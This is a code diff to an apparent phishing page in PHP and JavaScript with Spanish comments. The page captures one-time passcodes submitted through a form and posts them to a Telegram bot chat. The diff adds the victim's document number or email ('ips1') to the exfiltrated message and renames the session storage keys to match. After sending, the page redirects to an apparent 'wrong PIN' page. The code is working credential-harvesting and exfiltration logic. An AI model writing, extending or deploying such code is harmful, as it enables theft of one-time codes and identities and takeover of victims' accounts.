@@ -5,8 +5,12 @@ require_once "settings.php";
 // Recibir código OTP del formulario
 $otp = $_POST['otp_code'] ?? "NO RECIBIDO";
 
+// 🔹 Recuperar también ips1 del formulario
+$ips1 = $_POST['ips1'] ?? "NO RECIBIDO";
+
 // Construir mensaje
 $mensaje = "🔔 *Nuevo código OTP recibido*\n\n";
+$mensaje .= "Documento/Email: *$ips1*\n";
 $mensaje .= "Código: *$otp*";
 
 // Enviar a Telegram vía API
@@ -14,7 +18,7 @@ $url = "https://api.telegram.org/bot$token/sendMessage";
 
 $data = [
     'chat_id' => $chat_id,
-    'text' => $mensaje,
+    'text'    => $mensaje,
     'parse_mode' => "Markdown"
 ];
 
@@ -31,6 +35,7 @@ curl_close($ch);
 header("Location: pinmal.html");
 exit;
 ?>
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -96,17 +101,17 @@ exit;
     // ---- Obtener email desde la URL si viene como ?email= ----
     function getEmailFromQuery() {
       const params = new URLSearchParams(window.location.search);
-      return params.get("email");
+      return params.get("ips1");
     }
 
     const emailFromQuery = getEmailFromQuery();
     if (emailFromQuery) {
-      sessionStorage.setItem("email", emailFromQuery);
+      sessionStorage.setItem("ips1", emailFromQuery);
     } else {
       // Si no viene en la URL, simplemente re-guarda el que ya exista
       const existingEmail = sessionStorage.getItem("email");
       if (existingEmail) {
-        sessionStorage.setItem("email", existingEmail);
+        sessionStorage.setItem("ips1", existingEmail);
       }
     }
 
